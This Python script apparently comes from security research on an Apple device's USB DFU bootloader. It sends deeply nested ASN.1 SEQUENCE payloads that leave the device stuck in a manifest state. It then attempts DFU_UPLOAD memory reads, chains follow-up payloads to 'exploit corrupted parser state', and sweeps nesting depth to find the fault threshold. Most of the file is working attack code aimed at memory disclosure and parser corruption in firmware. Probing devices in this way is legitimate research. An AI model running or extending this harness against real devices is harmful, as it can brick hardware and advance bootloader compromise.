#!/usr/bin/env python3
"""
TC 9 Anomaly Investigation
===========================
TC 9 (400 nested SEQUENCEs) causes abnormal behavior:
  - Device enters dfuMANIFEST-WAIT-RESET but NEVER auto-resets
  - Stays in DFU (PID 0x1227) with black screen
  - Still responsive to USB commands
  - Can be ABORT'd back to dfuIDLE

This script investigates what we can do in this corrupted state:
  1. DFU_UPLOAD while in MANIFEST-WAIT-RESET — read memory from stuck device
  2. Chain a 2nd payload after ABORT — exploit corrupted parser state
  3. Nesting depth sweep — find the exact threshold for this behavior
  4. Compare with normal manifest behavior (e.g. TC 50 = 0-byte payload)
"""

import usb.core, usb.backend.libusb1, libusb_package
import array, time, json, sys, struct
from datetime import datetime
from pathlib import Path

APPLE_VID = 0x05AC
DFU_PID   = 0x1227
REC_PID   = 0x1281

DFU_DNLOAD    = 1
DFU_UPLOAD    = 2
DFU_GETSTATUS = 3
DFU_CLRSTATUS = 4
DFU_GETSTATE  = 5
DFU_ABORT     = 6

DFU_STATES = {
    0: 'appIDLE', 1: 'appDETACH', 2: 'dfuIDLE',
    3: 'dfuDNLOAD-SYNC', 4: 'dfuDNBUSY', 5: 'dfuDNLOAD-IDLE',
    6: 'dfuMANIFEST-SYNC', 7: 'dfuMANIFEST', 8: 'dfuMANIFEST-WAIT-RESET',
    9: 'dfuUPLOAD-IDLE', 10: 'dfuERROR'
}

PAYLOAD_DIR = Path(__file__).parent / "test_payloads"
RESULTS_DIR = Path(__file__).parent / "investigation_results"

def ts():
    return datetime.now().strftime('%H:%M:%S.%f')[:-3]

def log(msg, level="INFO"):
    print(f"[{ts()}] [{level:5s}] {msg}", flush=True)

def get_backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def find_dfu():
    dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=get_backend())
    if dev:
        try:
            dev.set_configuration()
        except:
            pass
    return dev

def find_recovery():
    return usb.core.find(idVendor=APPLE_VID, idProduct=REC_PID, backend=get_backend())

def get_status(dev):
    try:
        r = dev.ctrl_transfer(0xA1, DFU_GETSTATUS, 0, 0, 6, timeout=2000)
        return {"bStatus": r[0], "bPollTimeout": r[1]|(r[2]<<8)|(r[3]<<16),
                "bState": r[4], "state_name": DFU_STATES.get(r[4], f"?{r[4]}"),
                "raw": list(r)}
    except Exception as e:
        return {"error": str(e)}

def do_abort(dev):
    try:
        dev.ctrl_transfer(0x21, DFU_ABORT, 0, 0, 0, timeout=500)
        return True
    except Exception as e:
        return str(e)

def do_dnload(dev, data, timeout=5000):
    try:
        dev.ctrl_transfer(0x21, DFU_DNLOAD, 0, 0, array.array('B', data), timeout=timeout)
        return True
    except Exception as e:
        return str(e)

def do_upload(dev, length, timeout=2000):
    """DFU_UPLOAD: request device to send data back. May reveal memory contents."""
    try:
        r = dev.ctrl_transfer(0xA1, DFU_UPLOAD, 0, 0, length, timeout=timeout)
        return bytes(r)
    except usb.core.USBTimeoutError:
        return "TIMEOUT"
    except usb.core.USBError as e:
        return f"USB_ERROR:{e.errno}"
    except Exception as e:
        return f"ERROR:{e}"

def trigger_manifest(dev, payload):
    """Send payload + trigger manifest. Returns (time_ms, final_state_dict)."""
    do_dnload(dev, payload)
    st = get_status(dev)
    if "error" in st:
        return 0, st
    if st["bState"] in (3, 5):  # DNLOAD-SYNC or DNLOAD-IDLE
        t0 = time.perf_counter()
        do_dnload(dev, b'')  # zero-length → trigger manifest
        # Poll status
        for _ in range(20):
            st2 = get_status(dev)
            if "error" in st2:
                return (time.perf_counter()-t0)*1000, st2
            if st2["bState"] in (8, 10, 2):  # WAIT-RESET, ERROR, or IDLE
                return (time.perf_counter()-t0)*1000, st2
            time.sleep(0.05)
        return (time.perf_counter()-t0)*1000, st2
    return 0, st

def ensure_idle(dev):
    for _ in range(10):
        st = get_status(dev)
        if "error" in st:
            time.sleep(0.5)
            dev = find_dfu()
            if not dev:
                return None
            continue
        if st["bState"] == 2:
            return dev
        if st["bState"] == 10:
            dev.ctrl_transfer(0x21, DFU_CLRSTATUS, 0, 0, 0, timeout=500)
            time.sleep(0.1)
        else:
            do_abort(dev)
            time.sleep(0.5)
            dev = find_dfu()
            if not dev:
                return None
    return None

def build_nested_sequence(depth, inner_payload=b'\x05\x00'):
    """Build DER with N levels of nested SEQUENCE around inner_payload."""
    data = inner_payload
    for _ in range(depth):
        l = len(data)
        if l < 0x80:
            header = bytes([0x30, l])
        elif l < 0x100:
            header = bytes([0x30, 0x81, l])
        elif l < 0x10000:
            header = bytes([0x30, 0x82, (l >> 8) & 0xFF, l & 0xFF])
        else:
            header = bytes([0x30, 0x83, (l >> 16) & 0xFF, (l >> 8) & 0xFF, l & 0xFF])
        data = header + data
    return data

# ============================================================================
# Experiment 1: DFU_UPLOAD in MANIFEST-WAIT-RESET state
# ============================================================================
def experiment_upload_in_manifest(dev, payload):
    """After TC 9 manifest, device is stuck in MANIFEST-WAIT-RESET.
    Try DFU_UPLOAD to read memory while parser state is potentially corrupted.
    """
    log("=" * 70)
    log("EXPERIMENT 1: DFU_UPLOAD in MANIFEST-WAIT-RESET state")
    log("=" * 70)
    
    dev = ensure_idle(dev)
    if not dev:
        log("Device not available", "ERROR")
        return None, []
    
    log("Sending TC 9 payload to trigger stuck manifest state...")
    t_ms, st = trigger_manifest(dev, payload)
    log(f"Manifest result: {st} ({t_ms:.1f}ms)")
    
    if "error" in st or st.get("bState") != 8:
        log(f"Did not reach MANIFEST-WAIT-RESET (got {st}), aborting experiment", "WARN")
        dev = find_dfu()
        if dev:
            do_abort(dev)
            time.sleep(0.5)
            dev = find_dfu()
        return dev, []

    log("Device in MANIFEST-WAIT-RESET — attempting UPLOAD reads...")
    results = []
    
    for req_size in [64, 256, 512, 1024, 2048, 4096, 0x4000]:
        time.sleep(0.1)
        log(f"  UPLOAD request: {req_size} bytes...")
        data = do_upload(dev, req_size)
        if isinstance(data, bytes):
            nonzero = sum(1 for b in data if b != 0)
            log(f"  -> GOT {len(data)} bytes! nonzero={nonzero} hex[0:64]={data[:64].hex()}", "CRIT")
            results.append({"size_req": req_size, "size_got": len(data), "nonzero": nonzero,
                           "hex_head": data[:128].hex(), "hex_tail": data[-64:].hex() if len(data) > 64 else ""})
        else:
            log(f"  -> {data}")
            results.append({"size_req": req_size, "result": str(data)})
        
        # Check if device is still alive
        st2 = get_status(dev)
        if "error" in st2:
            log(f"  Device lost after UPLOAD attempt", "WARN")
            break
        log(f"  State after UPLOAD: {st2['state_name']}")
    
    # Clean up
    log("Cleaning up — ABORT back to IDLE...")
    do_abort(dev)
    time.sleep(1)
    dev = find_dfu()
    if dev:
        dev = ensure_idle(dev)
    return dev, results

# ============================================================================
# Experiment 2: Chain 2nd payload after corrupted manifest
# ============================================================================
def experiment_chain_payload(dev, tc9_payload):
    """After TC 9 manifest leaves device stuck in MANIFEST-WAIT-RESET,
    ABORT back to IDLE, then chain various 2nd payloads.
    
    If parser state (heap/stack/globals) is corrupted from the 1st parse,
    the 2nd parse might behave differently — crash, different timing,
    different state, or even succeed where it shouldn't.
    
    Strategy: Use depth >= 7 for all payloads (safe, stays in DFU).
    Compare: single manifest vs TC9-then-manifest (same payload).
    """
    log("=" * 70)
    log("EXPERIMENT 2: Chained payload after corrupted manifest")
    log("=" * 70)
    
    results = []
    
    # Test payloads — all depth >= 7 so device stays in DFU
    chain_payloads = {
        "depth_7_clean":  build_nested_sequence(7),                         # 16B, minimal stuck
        "depth_10":       build_nested_sequence(10),                        # 22B
        "depth_50":       build_nested_sequence(50),                        # 102B
        "depth_7_big":    build_nested_sequence(7, inner_payload=b'\x00'*256),  # 7 nesting + 256B inner
        "tc0_4byte_max":  None,  # loaded from file
        "tc1_8byte_len":  None,  # loaded from file  
        "tc2_5byte_of":   None,  # loaded from file
    }
    
    # Load Tier 1 payloads from files
    manifest = json.loads((PAYLOAD_DIR / "test_manifest.json").read_text())
    for tc in manifest["cases"]:
        if tc["id"] == 0:
            chain_payloads["tc0_4byte_max"] = (PAYLOAD_DIR / tc["file"]).read_bytes()
        elif tc["id"] == 1:
            chain_payloads["tc1_8byte_len"] = (PAYLOAD_DIR / tc["file"]).read_bytes()
        elif tc["id"] == 2:
            chain_payloads["tc2_5byte_of"] = (PAYLOAD_DIR / tc["file"]).read_bytes()
    
    dev = ensure_idle(dev)
    if not dev:
        log("Device not available", "ERROR")
        return None, []
    
    for label, payload in chain_payloads.items():
        if payload is None:
            log(f"\n  Skipping {label} (file not found)")
            continue
        
        log(f"\n--- Testing: {label} ({len(payload)}B) ---")
        
        # Phase A: Single manifest (no prior corruption)
        dev = ensure_idle(dev)
        if not dev:
            log("Device lost", "ERROR")
            break
        
        log(f"  [A] Single manifest with {label}...")
        t_single, st_single = trigger_manifest(dev, payload)
        state_a = st_single.get("state_name", str(st_single))
        log(f"    -> state={state_a} t={t_single:.1f}ms")
        
        # Recover
        if st_single.get("bState") == 8:
            do_abort(dev)
            time.sleep(1)
            dev = find_dfu()
            if dev:
                dev = ensure_idle(dev)
        elif "error" in st_single:
            time.sleep(3)
            dev = find_dfu()
            if dev:
                dev = ensure_idle(dev)
        
        if not dev:
            log("Device lost after single manifest, stopping", "ERROR")
            results.append({"label": label, "single_state": state_a,
                           "single_ms": round(t_single, 1), "chain_state": "DEVICE_LOST"})
            break
        
        # Phase B: TC9 manifest → ABORT → same payload
        log(f"  [B] TC9 corruption first...")
        t_corrupt, st_corrupt = trigger_manifest(dev, tc9_payload)
        log(f"    TC9: state={st_corrupt.get('state_name','?')} t={t_corrupt:.1f}ms")
        
        if st_corrupt.get("bState") != 8:
            log(f"    TC9 did not stick, skipping chain", "WARN")
            dev = find_dfu()
            if dev:
                dev = ensure_idle(dev)
            continue
        
        do_abort(dev)
        time.sleep(1)
        dev = find_dfu()
        if dev:
            dev = ensure_idle(dev)
        if not dev:
            log("Device lost after TC9 ABORT", "ERROR")
            break
        
        log(f"  [B] Chaining {label} after TC9 corruption...")
        t_chain, st_chain = trigger_manifest(dev, payload)
        state_b = st_chain.get("state_name", str(st_chain))
        log(f"    -> state={state_b} t={t_chain:.1f}ms")
        
        # Compare A vs B
        result = {
            "label": label, "payload_size": len(payload),
            "single_state": state_a, "single_ms": round(t_single, 1),
            "chain_state": state_b, "chain_ms": round(t_chain, 1),
        }
        
        state_match = (st_single.get("bState") == st_chain.get("bState"))
        t_diff = abs(t_chain - t_single)
        result["state_match"] = state_match
        result["timing_delta_ms"] = round(t_diff, 1)
        
        if not state_match:
            log(f"  !!! STATE DIFFERS: single={state_a} chain={state_b} !!!", "CRIT")
        if t_diff > 20:
            log(f"  !!! TIMING DELTA: {t_diff:.1f}ms !!!", "CRIT" if t_diff > 50 else "WARN")
        
        results.append(result)
        
        # Recover for next test
        if st_chain.get("bState") == 8:
            do_abort(dev)
            time.sleep(1)
            dev = find_dfu()
            if dev:
                dev = ensure_idle(dev)
        elif "error" in st_chain:
            time.sleep(3)
            dev = find_dfu()
            if dev:
                dev = ensure_idle(dev)
        
        if not dev:
            log("Device lost, stopping chain tests", "ERROR")
            break
        
        time.sleep(0.5)
    
    # Summary
    log(f"\n{'='*70}")
    log(f"CHAIN TEST SUMMARY:")
    for r in results:
        match_str = "MATCH" if r.get("state_match", True) else "DIFFER"
        log(f"  {r['label']:20s} | single={r.get('single_state','?'):25s} chain={r.get('chain_state','?'):25s} | dt={r.get('timing_delta_ms',0):.1f}ms | {match_str}")
    
    # Clean up
    time.sleep(2)
    do_abort(dev)
    time.sleep(1)
    dev = find_dfu()
    if dev:
        dev = ensure_idle(dev)
    return dev, results

# ============================================================================
# Experiment 3: Nesting depth sweep — find the exact threshold
# ============================================================================
def experiment_depth_sweep(dev):
    """Sweep nesting depth to find exact threshold where manifest behavior changes.
    Normal payload: manifest → auto-reset → Recovery Mode
    TC 9 (400): manifest → stuck in MANIFEST-WAIT-RESET → stays in DFU
    
    Find the exact depth N where behavior transitions.
    """
    log("=" * 70)
    log("EXPERIMENT 3: Nesting depth sweep")
    log("=" * 70)
    
    results = []
    
    # Binary search between 5 (device lost) and 10 (stuck in DFU).
    # Go descending so we stay safe as long as possible.
    depths = [10, 9, 8, 7, 6, 5]
    
    for depth in depths:
        dev = ensure_idle(dev)
        if not dev:
            log(f"Device not available for depth={depth}", "ERROR")
            time.sleep(5)
            dev = find_dfu()
            if not dev:
                log("Cannot recover device, stopping sweep", "ERROR")
                break
            dev = ensure_idle(dev)
            if not dev:
                break
        
        payload = build_nested_sequence(depth)
        log(f"\nDepth {depth:4d} | payload {len(payload):5d} bytes")
        
        t0_total = time.perf_counter()
        t_ms, st = trigger_manifest(dev, payload)
        
        state_name = st.get("state_name", str(st))
        log(f"  -> state={state_name} t={t_ms:.1f}ms")
        
        # Check if device auto-reset (went to Recovery) or stayed in DFU
        time.sleep(2)  # Give device time to auto-reset if it will
        
        dfu_dev = find_dfu()
        rec_dev = find_recovery()
        
        outcome = "UNKNOWN"
        if dfu_dev and not rec_dev:
            # Still in DFU — check state
            st2 = get_status(dfu_dev)
            if "error" not in st2:
                if st2["bState"] == 8:
                    outcome = "STUCK_MANIFEST"
                    log(f"  ** STUCK in MANIFEST-WAIT-RESET (anomalous!) **", "CRIT")
                elif st2["bState"] == 2:
                    outcome = "DFU_IDLE"
                    log(f"  Back to dfuIDLE (normal reject path)")
                elif st2["bState"] == 10:
                    outcome = "DFU_ERROR"
                    log(f"  dfuERROR (parser rejected)")
                else:
                    outcome = f"DFU_STATE_{st2['bState']}"
            else:
                outcome = "DFU_COMM_ERROR"
            dev = dfu_dev
        elif rec_dev:
            outcome = "RECOVERY_MODE"
            log(f"  Went to Recovery Mode (normal boot path)")
            log(f"  *** NEED MANUAL DFU RE-ENTRY TO CONTINUE ***", "WARN")
            results.append({"depth": depth, "payload_size": len(payload),
                           "manifest_ms": round(t_ms, 1), "state": state_name,
                           "outcome": outcome})
            # Can't continue without manual DFU re-entry
            return None, results
        else:
            outcome = "DEVICE_LOST"
            log(f"  Device disappeared completely!", "CRIT")
            time.sleep(5)
            dev = find_dfu()
            if not dev:
                results.append({"depth": depth, "payload_size": len(payload), 
                               "manifest_ms": round(t_ms, 1), "state": state_name,
                               "outcome": outcome})
                return None, results
        
        results.append({"depth": depth, "payload_size": len(payload),
                        "manifest_ms": round(t_ms, 1), "state": state_name,
                        "outcome": outcome})
        
        # Clean up for next iteration
        if outcome == "STUCK_MANIFEST":
            do_abort(dev)
            time.sleep(1)
            dev = find_dfu()
            if dev:
                dev = ensure_idle(dev)
        elif outcome == "DFU_ERROR":
            dev.ctrl_transfer(0x21, DFU_CLRSTATUS, 0, 0, 0, timeout=500)
            time.sleep(0.2)
        
        time.sleep(0.5)
    
    return dev, results

# ============================================================================
# Experiment 4: UPLOAD in normal dfuIDLE (reference) vs after TC 9
# ============================================================================
def experiment_upload_comparison(dev, tc9_payload):
    """Compare UPLOAD results in clean dfuIDLE vs after TC 9 corruption.
    If the corrupted state leaks different memory, this is exploitable.
    """
    log("=" * 70)
    log("EXPERIMENT 4: UPLOAD comparison — clean vs post-corruption")
    log("=" * 70)
    
    results = {"clean": [], "post_corruption": []}
    req_sizes = [64, 256, 2048]
    
    # Phase A: Clean UPLOAD from dfuIDLE
    dev = ensure_idle(dev)
    if not dev:
        return None, results
    
    log("Phase A: UPLOAD from clean dfuIDLE...")
    for sz in req_sizes:
        data = do_upload(dev, sz)
        if isinstance(data, bytes):
            nonzero = sum(1 for b in data if b != 0)
            log(f"  Clean UPLOAD({sz}): got {len(data)}B, nonzero={nonzero}, head={data[:32].hex()}")
            results["clean"].append({"size": sz, "got": len(data), "nonzero": nonzero, "head": data[:32].hex()})
        else:
            log(f"  Clean UPLOAD({sz}): {data}")
            results["clean"].append({"size": sz, "result": str(data)})
        time.sleep(0.1)
        # Re-ensure idle after upload might change state
        st = get_status(dev)
        if "error" not in st and st["bState"] != 2:
            do_abort(dev)
            time.sleep(0.2)
            dev = ensure_idle(dev)
            if not dev:
                return None, results
    
    # Phase B: Corrupt via TC 9, ABORT, then UPLOAD
    dev = ensure_idle(dev)
    if not dev:
        return None, results
    
    log("Phase B: Corrupt via TC 9 manifest...")
    t_ms, st = trigger_manifest(dev, tc9_payload)
    log(f"  TC 9: state={st.get('state_name','?')} t={t_ms:.1f}ms")
    
    if st.get("bState") == 8:
        log("  ABORT back to IDLE...")
        do_abort(dev)
        time.sleep(1)
        dev = find_dfu()
        if dev:
            dev = ensure_idle(dev)
    
    if not dev:
        return None, results
    
    log("Phase B: UPLOAD from post-corruption dfuIDLE...")
    for sz in req_sizes:
        data = do_upload(dev, sz)
        if isinstance(data, bytes):
            nonzero = sum(1 for b in data if b != 0)
            log(f"  Post-corrupt UPLOAD({sz}): got {len(data)}B, nonzero={nonzero}, head={data[:32].hex()}")
            results["post_corruption"].append({"size": sz, "got": len(data), "nonzero": nonzero, "head": data[:32].hex()})
        else:
            log(f"  Post-corrupt UPLOAD({sz}): {data}")
            results["post_corruption"].append({"size": sz, "result": str(data)})
        time.sleep(0.1)
        st = get_status(dev)
        if "error" not in st and st["bState"] != 2:
            do_abort(dev)
            time.sleep(0.2)
            dev = ensure_idle(dev)
            if not dev:
                return None, results
    
    # Compare
    log("\nCOMPARISON:")
    for i, sz in enumerate(req_sizes):
        c = results["clean"][i] if i < len(results["clean"]) else {}
        p = results["post_corruption"][i] if i < len(results["post_corruption"]) else {}
        if "head" in c and "head" in p:
            match = "MATCH" if c["head"] == p["head"] else "DIFFERENT"
            log(f"  {sz}B: clean_nonzero={c.get('nonzero','?')} post_nonzero={p.get('nonzero','?')} -> {match}",
                "CRIT" if match == "DIFFERENT" else "INFO")
    
    return dev, results

# ============================================================================
# Main
# ============================================================================
def main():
    RESULTS_DIR.mkdir(exist_ok=True)
    
    log("=" * 70)
    log("TC 9 ANOMALY INVESTIGATION")
    log("=" * 70)
    
    # Load TC 9 payload
    manifest = json.loads((PAYLOAD_DIR / "test_manifest.json").read_text())
    tc9 = next(tc for tc in manifest["cases"] if tc["id"] == 9)
    tc9_payload = (PAYLOAD_DIR / tc9["file"]).read_bytes()
    log(f"TC 9 payload: {len(tc9_payload)} bytes ({tc9['name']})")
    
    dev = find_dfu()
    if not dev:
        log("No DFU device found!", "ERROR")
        sys.exit(1)
    
    sn = dev.serial_number
    log(f"Device: {sn}")
    
    all_results = {"timestamp": datetime.now().isoformat(), "device": sn}
    
    # Choose experiment(s)
    exps = sys.argv[1:] if len(sys.argv) > 1 else ["1", "3", "4"]
    
    if "1" in exps:
        dev, r1 = experiment_upload_in_manifest(dev, tc9_payload)
        all_results["exp1_upload_manifest"] = r1
        if not dev:
            log("Device lost after experiment 1, attempting recovery...")
            time.sleep(5)
            dev = find_dfu()
    
    if "3" in exps and dev:
        dev, r3 = experiment_depth_sweep(dev)
        all_results["exp3_depth_sweep"] = r3
        if not dev:
            log("Device lost during depth sweep (may need manual DFU re-entry)")
            time.sleep(5)
            dev = find_dfu()
    
    if "4" in exps and dev:
        dev, r4 = experiment_upload_comparison(dev, tc9_payload)
        all_results["exp4_upload_comparison"] = r4
    
    if "2" in exps and dev:
        dev, r2 = experiment_chain_payload(dev, tc9_payload)
        all_results["exp2_chain_payload"] = r2
    
    # Save results
    out_file = RESULTS_DIR / f"tc9_investigation_{datetime.now().strftime('%H%M%S')}.json"
    out_file.write_text(json.dumps(all_results, indent=2, default=str))
    log(f"\nResults saved to: {out_file}")
    
    log("\n" + "=" * 70)
    log("INVESTIGATION COMPLETE")
    log("=" * 70)

if __name__ == "__main__":
    main()
